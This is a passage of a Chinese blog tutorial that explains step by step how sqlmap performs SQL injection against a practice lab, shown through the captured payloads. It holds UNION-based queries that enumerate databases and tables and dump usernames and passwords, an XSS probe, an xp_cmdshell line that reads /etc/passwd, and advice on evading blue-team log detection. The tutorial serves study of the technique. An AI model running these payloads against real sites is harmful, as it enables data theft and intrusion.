<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> group_concat(username,<span class="number">0x3a</span>,<span class="number">0x3a</span>,password) <span class="keyword">from</span> test.users) <span class="comment">--+</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-sqlmap-注入过程详解"><a href="#5-sqlmap-注入过程详解" class="headerlink" title="5.sqlmap 注入过程详解"></a>5.sqlmap 注入过程详解</h2><p>sqlmap 在完成一次完整注入过程中发生了什么呢？</p><p><strong>1.环境</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">burp suite v_2021.6.2</span><br><span class="line">sqlmap v_1.5.8</span><br><span class="line">封神台、sqli靶场</span><br></pre></td></tr></table></figure><p>**2.开始测试 **</p><p>1.将sqlmap 的请求经过burpsuite</p><p>在 sqlmap 使用 **–proxy=”<a href="http://127.0.0.1:8080&quot;">http://127.0.0.1:8080&quot;</a> ** 参数即可</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE1.png">    </p><p>在上面我们会发现，<strong>User-Agent：sqlmap/1.5.8#stable (http: //sqlmap.org)</strong>  ,这样的头部内容在web 日志里很容易引起蓝方的怀疑。所以我们再加上 <strong>–random-agent</strong> 参数，自动生成合适的 <strong>User-Agent</strong>，效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE15.png">    </p><p>2.首先，sqlmap 会先发送多遍正常的请求，确认测试目标URL内容是否稳定（相当于刷新）</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE16.png">    </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE1.png">    </p><p>3.然后开始下一项测试，这次发送的id变成了 7115 。意思是 测试获取参数“id”是否为动态，然后得出结论: 获取参数“id”似乎是动态的 （在改变 id 后观察页面是否相同）</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE17.png">    </p><p>4.检测数据库类型</p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE19.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是它使用的payload  ?id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">28.</span><span class="operator">%</span><span class="number">28</span><span class="operator">%</span><span class="number">2</span>C<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">29.</span><span class="operator">%</span><span class="number">29</span> URL解码后： )&quot;(.(,&#x27;).)</span><br></pre></td></tr></table></figure><p>5.下一项检测是否存在 XSS </p><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE18.png">发送了测试代码</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>mJUs<span class="operator">=</span><span class="number">1481</span><span class="operator">%</span><span class="number">20</span><span class="keyword">AND</span><span class="operator">%</span><span class="number">201</span><span class="operator">%</span><span class="number">3</span>D1<span class="operator">%</span><span class="number">20</span><span class="keyword">UNION</span><span class="operator">%</span><span class="number">20</span><span class="keyword">ALL</span><span class="operator">%</span><span class="number">20</span><span class="keyword">SELECT</span><span class="operator">%</span><span class="number">201</span><span class="operator">%</span><span class="number">2</span>CNULL<span class="operator">%</span><span class="number">2</span>C<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">3</span>Cscript<span class="operator">%</span><span class="number">3</span>Ealert<span class="operator">%</span><span class="number">28</span><span class="operator">%</span><span class="number">22</span>XSS<span class="operator">%</span><span class="number">22</span><span class="operator">%</span><span class="number">29</span><span class="operator">%</span><span class="number">3</span>C<span class="operator">%</span><span class="number">2</span>Fscript<span class="operator">%</span><span class="number">3</span>E<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">2</span>Ctable_name<span class="operator">%</span><span class="number">20</span><span class="keyword">FROM</span><span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">WHERE</span><span class="operator">%</span><span class="number">202</span><span class="operator">%</span><span class="number">3E1</span><span class="comment">--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1&quot; 200 721</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MTRleed/PicGo@master/2021/QQ%E6%88%AA%E5%9B%BE2.png"></p><p>其中一些代码进行了URL编码，解码后得到：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>mJUs<span class="operator">=</span><span class="number">1481</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="keyword">NULL</span>,<span class="string">&#x27;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span>,table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> <span class="number">2</span><span class="operator">&gt;</span><span class="number">1</span><span class="comment">--/**/; EXEC xp_cmdshell(&#x27;cat ../../../etc/passwd&#x27;)# HTTP/1.1&quot; 200 721</span></span><br></pre></td></tr></table></figure><p>5.下面开始进行注入测试，如果没有指定sqlmap使用哪一种注入方式，它会将所有的注入方式都跑一遍。而且会按以下顺序进行注入，这就是为什么我们使用的sqlmap总喜欢用布尔盲注的原因。sqlmap中有以下几种注入方式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--technique 参数</span></span><br><span class="line">B: <span class="type">Boolean</span><span class="operator">-</span>based blind <span class="keyword">SQL</span> injection（布尔型注⼊）</span><br><span class="line">E: Error<span class="operator">-</span>based <span class="keyword">SQL</span> injection（报错型注⼊）</span><br><span class="line">U: <span class="keyword">UNION</span> query <span class="keyword">SQL</span> injection（可联合查询注⼊）</span><br><span class="line">S: Stacked queries <span class="keyword">SQL</span> injection（可多语句查询注⼊）</span><br><span class="line">T: <span class="type">Time</span><span class="operator">-</span>based blind <span class="keyword">SQL</span> injection（基于时间延迟注⼊）</span><br><span class="line">Q: inline_query <span class="keyword">SQL</span> injection(内联注⼊)</span><br></pre></td></tr></table></figure><ol start="6"><li>在文件<code>boundaries.xml</code> 中选取合适的闭合方式，里面都是单引号，双引号，括号等等符号的组合。 在文件<code>sqlmap/data/xml/payloads</code>下选取对应的payload。所以梳理⼀下思路，我们最终会发送给⽬标服务器的payload ，不过首先要先闭合，在文件<code>boundaries.xml</code> 中，然后从对应的注入类型的模板中提取对应参数，如布尔盲注模板，然后再到<code>queries.xml</code>中取出想要的表达式，最后有必要的话使用 temper 对payload 进行修饰，最后输出的就是一个完整的 payload 。</li></ol><p><strong>以下是sqlmap一次完整的注入</strong></p><p>7.查字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 1-- -</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">6488</span><span class="comment">-- -</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 10-- -</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">6</span><span class="comment">-- -</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; ORDER BY 4-- -</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">3</span><span class="comment">-- -</span></span><br></pre></td></tr></table></figure><p>8.查数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,0x57546868445661497a474b574369506768417a597064667a614557616f6a754870464c64544e464a,0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> CONCAT(<span class="number">0x717a6a6a71</span>,<span class="number">0x6b4158546d48415a41496e48596448615867594e49525374436954664d5574505871726d51455279</span>,<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a6a71,0x464843574f4973414372614d414a73595970426c5177534767687050454a4a5647795a5375445a61,0x7162706a71)-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,<span class="number">0x57525a45435572416663</span>,<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; UNION ALL SELECT CONCAT(0x717a6a6a71,0x5a70654458455a6e7344,0x7162706a71),NULL,NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,<span class="number">0x55626b6e586165436468</span>,<span class="number">0x7162706a71</span>)<span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-4234</span><span class="string">&#x27; UNION ALL SELECT CONCAT(0x717a6a6a71,0x766455794f71597656557757576c4c6d6447656975464946565576714c47486d5852766154455359,0x7162706a71),NULL,NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-9821&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,<span class="number">0x726557794d7a476c4d5975697274766d704845684c646f68746a6e674e6a66436a77774a4e5a4455</span>,<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-6633</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,(CASE WHEN (2947=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                2947) THEN 1 ELSE 0 END),0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-5741&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (VERSION() <span class="keyword">LIKE</span> <span class="number">0x254d61726961444225</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>),<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-9889</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-4073&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (@<span class="variable">@VERSION</span>_COMMENT <span class="keyword">LIKE</span> <span class="number">0x256472697a7a6c6525</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>),<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-4680</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-9973&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,(<span class="keyword">CASE</span> <span class="keyword">WHEN</span> (AURORA_VERSION() <span class="keyword">LIKE</span> <span class="number">0x25</span>) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>),<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span><span class="comment">-- -</span></span><br><span class="line"></span><br><span class="line"><span class="number">-3008</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x7162706a71),NULL-- -</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-5854&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,CONCAT(<span class="number">0x717a6a6a71</span>,<span class="built_in">JSON_ARRAYAGG</span>(CONCAT_WS(<span class="number">0x6a77756c7677</span>,schema_name)),<span class="number">0x7162706a71</span>),<span class="keyword">NULL</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.SCHEMATA<span class="comment">-- -</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>9.查表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-4170</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,JSON_ARRAYAGG(CONCAT_WS(0x6a77756c7677,table_name)),0x7162706a71),NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x7365637572697479)-- -</span></span><br></pre></td></tr></table></figure><p>10.查字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-8178</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,JSON_ARRAYAGG(CONCAT_WS(0x6a77756c7677,column_name,column_type)),0x7162706a71),NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x7573657273 AND table_schema=0x7365637572697479-- -</span></span><br></pre></td></tr></table></figure><p>11.字段内容数据脱库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-3449</span><span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x717a6a6a71,JSON_ARRAYAGG(CONCAT_WS(0x6a77756c7677,id,password,username)),0x7162706a71),NULL FROM security.users-- -</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
